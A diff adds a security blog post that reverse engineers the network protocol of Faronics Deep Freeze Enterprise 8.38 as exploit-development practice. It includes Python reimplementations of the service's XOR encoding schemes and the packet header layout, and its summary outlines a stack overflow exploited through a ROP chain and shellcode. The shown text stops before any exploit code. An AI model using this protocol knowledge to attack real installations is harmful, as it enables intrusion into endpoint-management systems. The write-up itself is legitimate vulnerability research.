@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <title>Kernels and Cats</title>
+    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
+    <meta content="utf-8" http-equiv="encoding">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="theme-color" content="#000084" />
+    <meta name="google-site-verification" content="733C7I2uDZnatcput9zZupeQ_PX5Z0BJ1HmTnGi0SJI" />
+	<link rel="icon" href="https://kaligulaarmblessed.github.io/favicon.ico">
+    <link rel="canonical" href="https://kaligulaarmblessed.github.io">
+    
+    
+</head>
+<body>
+<nav class="navbar navbar-inverse navbar-fixed-top">
+    <div class="navbar-inner">
+        <div class="container">
+            <button type="button" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"></button>
+            <a class="brand" href="https://kaligulaarmblessed.github.io">Kernels and Cats</a>
+            <div class="nav-collapse collapse">
+                <ul class="nav">
+                    
+                    
+                        
+                            <li>
+                                <a href="/about/">
+                                    
+                                    <span>About</span>
+                                </a>
+                            </li>
+                        
+                    
+                        
+                            <li>
+                                <a href="/post/">
+                                    
+                                    <span>All posts</span>
+                                </a>
+                            </li>
+                        
+                    
+                        
+                            <li>
+                                <a href="/challenges/">
+                                    
+                                    <span>CTF Challenges</span>
+                                </a>
+                            </li>
+                        
+                    
+                </ul>
+            </div>
+        </div>
+    </div>
+</nav><div id="content" class="container">
+
+<div class="row-fluid navmargin">
+    <div class="page-header">
+        <h1>A Deep Dive into Faronics Deep Freeze Enterprise [Legacy Windows Software] - Fri, Dec 22, 2023</h1>
+    </div>
+    <p class="lead"></p>
+    <h4 id="tldr">TLDR</h4>
+<p>Faronics Deep Freeze Enterprise version 8.38.220.5256 is vulnerable to a stack buffer overflow vulnerability. It uses 2 XOR encoding schemes, as well as an additional third checksum, to ensure that the packets sent to it are valid. As DEP is enabled, the stack buffer overflow can be exploited by building a ROP chain with a dummy VirtualAlloc skeleton, patching the arguments in, and performing a stack pivot to call VirtualAlloc and finally return to our shellcode.</p>
+<h4 id="table-of-contents">Table of Contents</h4>
+<ol>
+<li><a href="#introduction-to-faronics">Introduction to Faronics</a></li>
+<li><a href="#basic-analysis">Basic Analysis</a></li>
+<li><a href="#wireshark">Wireshark</a></li>
+<li><a href="#xor-part-one">XOR Part One</a></li>
+<li><a href="#xor-part-two">XOR Part Two</a></li>
+<li><a href="#protocol-header-and-encode_three-checksum">Protocol Header and encode_three Checksum</a></li>
+<li><a href="#opcode-jumptable">Opcode Jumptable</a></li>
+<li><a href="#the-rabbit-hole">The Rabbit Hole</a></li>
+<li><a href="#the-actual-vulnerable-opcode">The Actual Vulnerable Opcode</a></li>
+</ol>
+<h4 id="introduction-to-faronics">Introduction to Faronics</h4>
+<p>Faronics Deep Freeze Enterprise is software that aims to protect endpoints by saving a snapshot of a computer’s desired configuration and settings, and allowing a revert to its previous state when desired. Version 8.38.220.5256, being old Windows software published in 2017, also makes it a perfect target for OSED practise :D This was a very interesting target to practise Windows reverse engineering on as the XOR encoding schemes it uses somehow feel very CTF-y, which was something I did not expect to see in real software!</p>
+<p>(Disclaimer 1: This post contains spoilers. Proceed at your own risk!)</p>
+<p>(Disclaimer 2: I wrote this quite a while later after I have pwned Faronics; if I do write any garbage, please correct me!)</p>
+<h4 id="basic-analysis">Basic Analysis</h4>
+<p>A quick look using TCPView from the SysInternals suite shows us that it is listening on both TCP and UDP port 7725 for connections.</p>
+<p><img src="/images/faronics_tcpview.jpg" alt="Faronics TCPView"></p>
+<p>I then opened the binary (DFServerService.exe) in IDA (note that the executable is packed with UPX; it must first be unpacked before reversing), and realized that at the function at 0x0045EBE0, there were two other functions, 0x0045EB58 and 0x0045EACC, which both called recv. Wanting to make my life easier, I opened the binary in WinDBG, set breakpoints on WSOCK32!recv, made a simple script using pwntools to send 1000 As, and tried to see what would happen. I realized that the function with the recv call at 0x0045EB58 would be called first, but as once my script finished executing it closed the socket, and hence the recv would fail. Adding a pause() after sending the As helped, and I realized that recv was called twice; the call at 0x0045EB58 was to receive the number of bytes that would be received as data, and the second call at 0x0045EACC was to actually receive the data.</p>
+<p>However, as there was a lot of assembly code (we are not allowed to use a decompiler in the OSED) <del>and I was lazy</del>, instead of looking through the pile of assembly after the recv calls, I turned to wireshark to help me in my analysis.</p>
+<h4 id="wireshark">Wireshark</h4>
+<p>I pulled Wireshark onto the debugging machine where Faronics was installed, and started pressing random things in the admin control panel to try to trigger messages sent by the admin panel to DFServerService in an attempt to get an easy pass on understanding the protocol. The local admin panel also initiates a connection to the server service via port 7725, so if we sniff traffic on localhost, we would be able to see all communication between the server service and the admin.</p>
+<p><img src="/images/faronics_adminconsole.jpg" alt="Faronics Admin Console"></p>
+<p>(The Faronics Deep Freeze Admin Console &ndash; in this case, the admin console on localhost is connected to the server service running on port 7725. I performed random operations such as the Add Group as shown above to try to trigger messages which I could capture.)</p>
+<p>After sniffing the traffic on wireshark, I could see the message sending the length and data very clearly. The packet containing the length of the data is as such:</p>
+<p><img src="/images/faronics_wireshark1.jpg" alt="Faronics packet with length of data"></p>
+<p>And the packet containing the data (which is currently gibberish):</p>
+<p><img src="/images/faronics_wireshark2.jpg" alt="Faronics data packet"></p>
+<p>And an actual wireshark:</p>
+<p><img src="/images/faronics_wireshark3.png" alt="Shork"></p>
+<p>Apparently the sharks will attack internet cables as the cables generate an electric field, possibly making the sharks (which are very sensitive to electromagnetic fields due to special organs known as ampullae of Lorenzini) think of them as prey.</p>
+<p>Anyways, we can clearly see that the data is being encoded in some form, which means that we have to reverse engineer some form of encoding mechanism. From the IDA screenshot below, you can see the function that calls recv for the size, as well as for the data. After the data has been successfully received, code execution proceeds to 0x0045EE0B, and then 0x0045EE31, where it will call the &ldquo;do_encrypt_and_checksum&rdquo; function at 0x0045E36C.</p>
+<p><img src="/images/faronics_ida1.jpg" alt="Faronics IDA recv functions"></p>
+<p><img src="/images/faronics_ida2.jpg" alt="Faronics IDA right before do_encrypt_and_checksum"></p>
+<p>Inside the do_encrypt_and_checksum function at 0x0045E36C, there is another function &ldquo;do_encrypt_and_memcpy&rdquo; (sorry for the shitty names) at 0x0046F074, which will call two functions &ldquo;do_xor_part_one&rdquo; at 0x0046F220 and &ldquo;do_xor_part_two&rdquo; at 0x0046F1B4. This is where the fun begins.</p>
+<p><img src="/images/faronics_ida3.jpg" alt="Faronics IDA in do_encrypt_and_checksum"></p>
+<p><img src="/images/faronics_ida4.jpg" alt="Faronics IDA in do_encrypt_and_memcpy"></p>
+<h4 id="xor-part-one">XOR Part One</h4>
+<p>The gist of the XOR algorithm is this: an XOR key array will be generated based on a certain seed, and then each of the bytes of the payload would be XORed with its respective key byte.</p>
+<p>The &ldquo;do_xor_part_one&rdquo; function at 0x0046F220 will first call &ldquo;generate_xor_one_key&rdquo; at 0x004B04DC.</p>
+<p><img src="/images/faronics_ida5.jpg" alt="Faronics IDA in do_xor_part_one calling generate_xor_one_key"></p>
+<p>In the &ldquo;generate_xor_one_key&rdquo; function at 0x004B04DC, a seed value from DFServerService+0x5ed208 will first be extracted. Note that the seed value is generated based on the customization code entered when Faronics is installed. In this case, the customization code I used was &ldquo;meowmeow&rdquo;, which led to a seed value of 0x0c6e3d57. I suspect the seed value is generated by some hashing algorithm in the DFInit.exe executable that runs once Faronics has been installed, but that would be another reversing adventure for another day. Another value at DFServerService+0x5ed208+4 will be zeroed out &ndash; this value will be important later, and I will call this &ldquo;value2&rdquo;. After that is all done, the &ldquo;generate_xor_one_key_actual_math&rdquo; function at 0x004B04F8 will be called &ndash; this is the first part of the actual math to generate the key_array.</p>
+<p><img src="/images/faronics_ida6.jpg" alt="Faronics IDA in generate_xor_one_key"></p>
+<p>Some math is then done in &ldquo;generate_xor_one_key_actual_math&rdquo; to kick off the key generation process for the first XOR:</p>
+<p><img src="/images/faronics_ida7.jpg" alt="Faronics IDA in generate_xor_one_key_actual_math"></p>
+<p>These are the helper functions that I have used to make life a little easier:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">truncate</span>(num): 
+</span></span><span style="display:flex;"><span>    num <span style="color:#f92672">=</span> num <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> num
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">complement</span>(val):
+</span></span><span style="display:flex;"><span>    nbits <span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> val <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>: 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> val
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>: 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (val <span style="color:#f92672">+</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> nbits)) <span style="color:#f92672">%</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> nbits)    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">bit_not</span>(n, numbits<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> numbits) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span> n
+</span></span></code></pre></div><p>I have translated the logic into python to make it easier to understand:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_key_xor1</span>(num):
+</span></span><span style="display:flex;"><span>    key_arr <span style="color:#f92672">=</span> [] 
+</span></span><span style="display:flex;"><span>    printable <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    seed <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0c6e3d57</span> <span style="color:#75715e">## for meowmeow as the customization code</span>
+</span></span><span style="display:flex;"><span>    value2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
+</span></span><span style="display:flex;"><span>    seed <span style="color:#f92672">=</span> truncate(seed <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x15a4e35</span>)
+</span></span><span style="display:flex;"><span>    seed <span style="color:#f92672">=</span> truncate(seed <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(num): 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>: 
+</span></span><span style="display:flex;"><span>            part1 <span style="color:#f92672">=</span> seed <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x15a</span>
+</span></span><span style="display:flex;"><span>            part2 <span style="color:#f92672">=</span> seed <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x4e35</span>
+</span></span><span style="display:flex;"><span>            part2_high <span style="color:#f92672">=</span> part2 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>            part2_low <span style="color:#f92672">=</span> truncate(part2)
+</span></span><span style="display:flex;"><span>            part1 <span style="color:#f92672">=</span> truncate(part2_high <span style="color:#f92672">+</span> part1)
+</span></span><span style="display:flex;"><span>            part2_low <span style="color:#f92672">=</span> truncate(part2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>            seed <span style="color:#f92672">=</span> part2_low
+</span></span><span style="display:flex;"><span>            value2 <span style="color:#f92672">=</span> truncate(part1)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span></code></pre></div><p>Both seed and value2 are modified by the function, and will be further modified later in a loop in the XOR operation.</p>
+<p>After the seed value and value2 have been initialized, the loop to perform the XOR operation begins.</p>
+<p><img src="/images/faronics_ida8.jpg" alt="Faronics IDA XOR one loop"></p>
+<p>Returning back to &ldquo;do_xor_part_one&rdquo; at 0x0046F220, another function &ldquo;generate_xor_one_key_actual_math_2&rdquo; at 0x004B051C is then called to generate the values of the XOR key. Note that after &ldquo;generate_xor_one_key_actual_math_2&rdquo; is done, there is an additional <code>and eax, 0x800000FF</code> step in &ldquo;do_xor_part_one&rdquo;. The line <code>xor [ecx+eax], dl</code> then performs the actual XOR operation.</p>
+<p><img src="/images/faronics_ida9.jpg" alt="Faronics IDA in generate_xor_one_key_actual_math_2"></p>
+<p>I have also implemented this in python (hopefully this is readable; this is spaghetti code whoops) &ndash; continuing from the code above:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>: 
+</span></span><span style="display:flex;"><span>            part2 <span style="color:#f92672">=</span> value2 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x4e35</span>
+</span></span><span style="display:flex;"><span>            part1 <span style="color:#f92672">=</span> seed <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x15a</span>
+</span></span><span style="display:flex;"><span>            addition <span style="color:#f92672">=</span> truncate(truncate(part1) <span style="color:#f92672">+</span> truncate(part2))
+</span></span><span style="display:flex;"><span>            part3 <span style="color:#f92672">=</span> seed <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x4e35</span>
+</span></span><span style="display:flex;"><span>            part3_high <span style="color:#f92672">=</span> part3 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>            part3_low <span style="color:#f92672">=</span> truncate(part3)
+</span></span><span style="display:flex;"><span>            addition <span style="color:#f92672">=</span> truncate(part3_high <span style="color:#f92672">+</span> addition)
+</span></span><span style="display:flex;"><span>            seed <span style="color:#f92672">=</span> truncate(part3_low <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>            value2 <span style="color:#f92672">=</span> addition
+</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> value2 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x7fffffff</span>
+</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> result <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x800000ff</span>
+</span></span><span style="display:flex;"><span>        key_arr<span style="color:#f92672">.</span>append(result)
+</span></span><span style="display:flex;"><span>        printable<span style="color:#f92672">.</span>append(hex(result))
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#print(printable)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> key_arr
+</span></span></code></pre></div><h4 id="xor-part-two">XOR Part Two</h4>
+<p>Once &ldquo;do_xor_part_one&rdquo; is complete, it returns back to &ldquo;do_encrypt_and_memcpy&rdquo; at 0x0046F074, which will then call &ldquo;do_xor_part_two&rdquo; at 0x0046F1B4. &ldquo;do_xor_part_two&rdquo; will take the first 4 bytes of the payload decrypted by the first XOR scheme as the seed, and will start decrypting from the start of the payload + 4.</p>
+<p>&ldquo;do_xor_part_two&rdquo; will first call &ldquo;generate_xor_two_key&rdquo; at 0x0046F150, which will initialize the key generator by doing some math on the seed. The actual loop that performs the XOR operation will then start after the key generator has been initialized, and will call &ldquo;generate_xor_two_key&rdquo; for every loop. Similarly, the XOR operation is performed by the instruction <code>xor [ecx+eax], dl</code>.</p>
+<p><img src="/images/faronics_ida10.jpg" alt="Faronics IDA in do_xor_part_two"></p>
+<p>The function &ldquo;generate_xor_two_key&rdquo; at 0x0046F150 can be seen here:</p>
+<p><img src="/images/faronics_ida11.jpg" alt="Faronics IDA in generate_xor_two_key"></p>
+<p>I have also converted this XOR encoding scheme into a python function to generate the key array:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_key_xor2</span>(num, header):
+</span></span><span style="display:flex;"><span>    key_arr <span style="color:#f92672">=</span> [] 
+</span></span><span style="display:flex;"><span>    printable <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    ax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(num): 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>: 
+</span></span><span style="display:flex;"><span>            quotient <span style="color:#f92672">=</span> header <span style="color:#f92672">//</span> <span style="color:#ae81ff">0xb1</span>
+</span></span><span style="display:flex;"><span>            remainder <span style="color:#f92672">=</span> header <span style="color:#f92672">%</span> <span style="color:#ae81ff">0xb1</span>
+</span></span><span style="display:flex;"><span>            ecx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xab</span> <span style="color:#f92672">*</span> remainder
+</span></span><span style="display:flex;"><span>            part1 <span style="color:#f92672">=</span> quotient <span style="color:#f92672">+</span> quotient
+</span></span><span style="display:flex;"><span>            neg <span style="color:#f92672">=</span> complement(ecx <span style="color:#f92672">-</span> part1)
+</span></span><span style="display:flex;"><span>            ax <span style="color:#f92672">=</span> neg <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffff</span>
+</span></span><span style="display:flex;"><span>            ax <span style="color:#f92672">=</span> ax <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x7fff</span>
+</span></span><span style="display:flex;"><span>        ax_quotient <span style="color:#f92672">=</span> ax <span style="color:#f92672">//</span> <span style="color:#ae81ff">0xb1</span> <span style="color:#75715e">## ecx</span>
+</span></span><span style="display:flex;"><span>        ax_remainder <span style="color:#f92672">=</span> ax <span style="color:#f92672">%</span> <span style="color:#ae81ff">0xb1</span> <span style="color:#75715e">## edx</span>
+</span></span><span style="display:flex;"><span>        ecx <span style="color:#f92672">=</span> truncate(ax_remainder <span style="color:#f92672">*</span> <span style="color:#ae81ff">0xab</span>)
+</span></span><span style="display:flex;"><span>        ax <span style="color:#f92672">=</span> truncate(ax_quotient <span style="color:#f92672">+</span> ax_quotient) 
+</span></span><span style="display:flex;"><span>        ecx <span style="color:#f92672">=</span> truncate(complement(ecx <span style="color:#f92672">-</span> ax))
+</span></span><span style="display:flex;"><span>        ecx <span style="color:#f92672">=</span> ecx <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x7fff</span> <span style="color:#75715e">## eax</span>
+</span></span><span style="display:flex;"><span>        ax <span style="color:#f92672">=</span> ecx
+</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> ecx <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>
+</span></span><span style="display:flex;"><span>        key_arr<span style="color:#f92672">.</span>append(result)
+</span></span><span style="display:flex;"><span>        printable<span style="color:#f92672">.</span>append(hex(result))
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#print(printable)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> key_arr
+</span></span></code></pre></div><p>By this point, we have all we need to decode the encoded messages in wireshark! For example, for a &ldquo;list groups&rdquo; message, after decoding with 2 XOR operations (does not include part of the header):</p>
+<pre tabindex="0"><code>bytearray(b&#39;\x00\xff\xfe&lt;\x00?\x00x\x00m\x00l\x00 \x00v\x00e\x00r\x00s\x00i\x00o\x00n\x00=\x00&#34;\x001\x00.\x000\x00&#34;\x00 \x00e\x00n\x00c\x00o\x00d\x00i\x00n\x00g\x00=\x00&#34;\x00U\x00T\x00F\x00-\x001\x006\x00&#34;\x00?\x00&gt;\x00\r\x00\n\x00&lt;\x00G\x00r\x00o\x00u\x00p\x00s\x00&gt;\x00\r\x00\n\x00\t\x00&lt;\x00G\x00r\x00o\x00u\x00p\x001\x00 \x00N\x00a\x00m\x00e\x00=\x00&#34;\x00c\x00a\x00t\x00c\x00a\x00t\x00c\x00a\x00t\x00c\x00a\x00t\x00c\x00a\x00t\x00c\x00a\x00t\x00c\x00a\x00t\x00c\x00a\x00t\x00&#34;\x00 \x00I\x00d\x00=\x00&#34;\x001\x00&#34;\x00 \x00U\x00s\x00e\x00F\x00i\x00l\x00t\x00e\x00r\x00s\x00=\x00&#34;\x000\x00&#34;\x00 \x00F\x00i\x00l\x00t\x002\x00=\x00&#34;\x001\x00&#34;\x00 \x00P\x00a\x00r\x00e\x00n\x00t\x00I\x00d\x00=\x00&#34;\x000\x00&#34;\x00&gt;\x00\r\x00\n\x00\t\x00\t\x00&lt;\x00F\x00i\x00l\x00t\x00e\x00r\x00s\x00&gt;\x00\r\x00\n\x00\t\x00\t\x00\t\x00&lt;\x00F\x00i\x00l\x00t\x00e\x00r\x00 \x00O\x00p\x00=\x00&#34;\x00E\x00Q\x00U\x00&#34;\x00 \x00C\x00o\x00l\x00u\x00m\x00n\x00=\x00&#34;\x00L\x00I\x00S\x00T\x00V\x00I\x00E\x00W\x00_\x00W\x00K\x00S\x00&#34;\x00 \x00V\x00a\x00l\x00u\x00e\x00=\x00&#34;\x00&#34;\x00/\x00&gt;\x00&lt;\x00F\x00i\x00l\x00t\x00e\x00r\x00 \x00O\x00p\x00=\x00&#34;\x00E\x00Q\x00U\x00&#34;\x00 \x00C\x00o\x00l\x00u\x00m\x00n\x00=\x00&#34;\x00L\x00I\x00S\x00T\x00V\x00I\x00E\x00W\x00_\x00W\x00K\x00S\x00&#34;\x00 \x00V\x00a\x00l\x00u\x00e\x00=\x00&#34;\x00&#34;\x00/\x00&gt;\x00&lt;\x00/\x00F\x00i\x00l\x00t\x00e\x00r\x00s\x00&gt;\x00\r\x00\n\x00\t\x00&lt;\x00/\x00G\x00r\x00o\x00u\x00p\x001\x00&gt;\x00\r\x00\n\x00\t\x00&lt;\x00G\x00r\x00o\x00u\x00p\x002\x00 \x00N\x00a\x00m\x00e\x00=\x00&#34;\x00t\x00e\x00s\x00t\x00t\x00e\x00s\x00t\x00&#34;\x00 \x00I\x00d\x00=\x00&#34;\x002\x00&#34;\x00 \x00U\x00s\x00e\x00F\x00i\x00l\x00t\x00e\x00r\x00s\x00=\x00&#34;\x000\x00&#34;\x00 \x00F\x00i\x00l\x00t\x002\x00=\x00&#34;\x001\x00&#34;\x00 \x00P\x00a\x00r\x00e\x00n\x00t\x00I\x00d\x00=\x00&#34;\x000\x00&#34;\x00&gt;\x00&lt;\x00F\x00i\x00l\x00t\x00e\x00r\x00s\x00&gt;\x00&lt;\x00F\x00i\x00l\x00t\x00e\x00r\x00 \x00O\x00p\x00=\x00&#34;\x00E\x00Q\x00U\x00&#34;\x00 \x00C\x00o\x00l\x00u\x00m\x00n\x00=\x00&#34;\x00L\x00I\x00S\x00T\x00V\x00I\x00E\x00W\x00_\x00W\x00K\x00S\x00&#34;\x00 \x00V\x00a\x00l\x00u\x00e\x00=\x00&#34;\x00&#34;\x00/\x00&gt;\x00&lt;\x00F\x00i\x00l\x00t\x00e\x00r\x00 \x00O\x00p\x00=\x00&#34;\x00E\x00Q\x00U\x00&#34;\x00 \x00C\x00o\x00l\x00u\x00m\x00n\x00=\x00&#34;\x00L\x00I\x00S\x00T\x00V\x00I\x00E\x00W\x00_\x00W\x00K\x00S\x00&#34;\x00 \x00V\x00a\x00l\x00u\x00e\x00=\x00&#34;\x00&#34;\x00/\x00&gt;\x00&lt;\x00/\x00F\x00i\x00l\x00t\x00e\x00r\x00s\x00&gt;\x00&lt;\x00/\x00G\x00r\x00o\x00u\x00p\x002\x00&gt;\x00&lt;\x00G\x00r\x00o\x00u\x00p\x004\x00 \x00N\x00a\x00m\x00e\x00=\x00&#34;\x00m\x00e\x00o\x00w\x00c\x00a\x00t\x00s\x00&#34;\x00 \x00I\x00d\x00=\x00&#34;\x004\x00&#34;\x00 \x00U\x00s\x00e\x00F\x00i\x00l\x00t\x00e\x00r\x00s\x00=\x00&#34;\x000\x00&#34;\x00 \x00F\x00i\x00l\x00t\x002\x00=\x00&#34;\x001\x00&#34;\x00 \x00P\x00a\x00r\x00e\x00n\x00t\x00I\x00d\x00=\x00&#34;\x001\x00&#34;\x00&gt;\x00&lt;\x00F\x00i\x00l\x00t\x00e\x00r\x00s\x00&gt;\x00&lt;\x00F\x00i\x00l\x00t\x00e\x00r\x00 \x00O\x00p\x00=\x00&#34;\x00E\x00Q\x00U\x00&#34;\x00 \x00C\x00o\x00l\x00u\x00m\x00n\x00=\x00&#34;\x00L\x00I\x00S\x00T\x00V\x00I\x00E\x00W\x00_\x00W\x00K\x00S\x00&#34;\x00 \x00V\x00a\x00l\x00u\x00e\x00=\x00&#34;\x00&#34;\x00/\x00&gt;\x00&lt;\x00F\x00i\x00l\x00t\x00e\x00r\x00 \x00O\x00p\x00=\x00&#34;\x00E\x00Q\x00U\x00&#34;\x00 \x00C\x00o\x00l\x00u\x00m\x00n\x00=\x00&#34;\x00L\x00I\x00S\x00T\x00V\x00I\x00E\x00W\x00_\x00W\x00K\x00S\x00&#34;\x00 \x00V\x00a\x00l\x00u\x00e\x00=\x00&#34;\x00&#34;\x00/\x00&gt;\x00&lt;\x00/\x00F\x00i\x00l\x00t\x00e\x00r\x00s\x00&gt;\x00&lt;\x00/\x00G\x00r\x00o\x00u\x00p\x004\x00&gt;\x00&lt;\x00G\x00r\x00o\x00u\x00p\x005\x00 \x00N\x00a\x00m\x00e\x00=\x00&#34;\x00h\x00i\x00h\x00i\x00&#34;\x00 \x00I\x00d\x00=\x00&#34;\x005\x00&#34;\x00 \x00U\x00s\x00e\x00F\x00i\x00l\x00t\x00e\x00r\x00s&#39;)
+</code></pre><p>The characters inside use the Windows wchar type, so to make this more readable, I removed all the preceding null bytes to get the corresponding ASCII characters (does not include part of the header but those parts do not decode to nice ASCII bytes):</p>
+<pre tabindex="0"><code>bytearray(b&#39;97\x08\x14X\xa9\xf6\x01\\\x08\\\x08\x01\xf8\x01\xff\xfe&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-16&#34;?&gt;\r\n&lt;Groups&gt;\r\n\t&lt;Group1 Name=&#34;catcatcatcatcatcatcatcat&#34; Id=&#34;1&#34; UseFilters=&#34;0&#34; Filt2=&#34;1&#34; ParentId=&#34;0&#34;&gt;\r\n\t\t&lt;Filters&gt;\r\n\t\t\t&lt;Filter Op=&#34;EQU&#34; Column=&#34;LISTVIEW_WKS&#34; Value=&#34;&#34;/&gt;&lt;Filter Op=&#34;EQU&#34; Column=&#34;LISTVIEW_WKS&#34; Value=&#34;&#34;/&gt;&lt;/Filters&gt;\r\n\t&lt;/Group1&gt;\r\n\t&lt;Group2 Name=&#34;testtest&#34; Id=&#34;2&#34; UseFilters=&#34;0&#34; Filt2=&#34;1&#34; ParentId=&#34;0&#34;&gt;&lt;Filters&gt;&lt;Filter Op=&#34;EQU&#34; Column=&#34;LISTVIEW_WKS&#34; Value=&#34;&#34;/&gt;&lt;Filter Op=&#34;EQU&#34; Column=&#34;LISTVIEW_WKS&#34; Value=&#34;&#34;/&gt;&lt;/Filters&gt;&lt;/Group2&gt;&lt;Group4 Name=&#34;meowcats&#34; Id=&#34;4&#34; UseFilters=&#34;0&#34; Filt2=&#34;1&#34; ParentId=&#34;1&#34;&gt;&lt;Filters&gt;&lt;Filter Op=&#34;EQU&#34; Column=&#34;LISTVIEW_WKS&#34; Value=&#34;&#34;/&gt;&lt;Filter Op=&#34;EQU&#34; Column=&#34;LISTVIEW_WKS&#34; Value=&#34;&#34;/&gt;&lt;/Filters&gt;&lt;/Group4&gt;&lt;Group5 Name=&#34;hihi&#34; Id=&#34;5&#34; UseFilters&#39;)
+</code></pre><p>For this particular message, part of the decoded header was as such:</p>
+<pre tabindex="0"><code>Padding 1 (offset): 0x10
+Checksum 1: 0xa953
+Padding 2: 0x870
+Length (P1+P2): 0x880
+Checksum 4: 0x8373900 
+Checksum 3: 0x14
+Checksum 2: 0xa958
+Opcode: 0x1f6
+</code></pre><h4 id="protocol-header-and-encode_three-checksum">Protocol Header and encode_three Checksum</h4>
+<p>Through further reverse engineering and looking at certain checksums from the decoded Wireshark messages, the message header was determined to have the following structure:</p>
+<pre tabindex="0"><code>0x00 - 0x03: XOR 2 seed
+0x04 - 0x07: Offset
+0x08 - 0x0b: Checksum 1 (0x0a953)
+0x0c - 0x0f: Length of payload - offset
+0x10 - 0x13: encode_three Checksum
+0x14 - 0x17: Checksum 3 (0x14)
+0x18 - 0x1b: Checksum 2 (0xa958)
+0x1c - 0x1f: Opcode
+0x20 - 0x23: Size (?)
+0x24 - 0x27: Size (?)
+</code></pre><p>Before proceeding to the opcode jumptable, there is a final &ldquo;encode_three&rdquo; checksum check (it&rsquo;s only called that because that was the name of the function in my python code) to ensure that the message is valid.</p>
+<p>After &ldquo;do_encrypt_and_memcpy&rdquo; returns back into &ldquo;do_encrypt_and_checksum&rdquo; at 0x0045E36C, &ldquo;do_checksums&rdquo; at 0x0046EED4 is called.</p>
